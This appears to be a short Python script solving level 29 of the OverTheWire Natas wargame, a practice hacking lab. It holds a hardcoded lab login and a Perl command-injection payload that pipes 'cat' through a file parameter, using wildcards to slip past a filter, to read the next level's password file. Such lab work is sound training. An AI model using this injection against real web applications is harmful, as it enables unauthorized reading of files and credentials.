#! /usr/bin/env python

import requests
import re
import base64
import urllib
import string

usn = 'natas29'
url = 'http://%s.natas.labs.overthewire.org/index.pl?file=' % usn
passwd = 'airooCaiseiyee8he8xongien9euhe8b'
login = (usn, passwd)
request = requests.Session()
block_size = 16
perl_injection = "|cat /etc/na*as_webpass/na*as30 '\n'"

def get_source_code():
  
  #connection = request.get(url+perl_injection, auth = login)
 
  connection = request.get(url + perl_injection, auth = login)

  print connection.text

#def solve_lab():
  
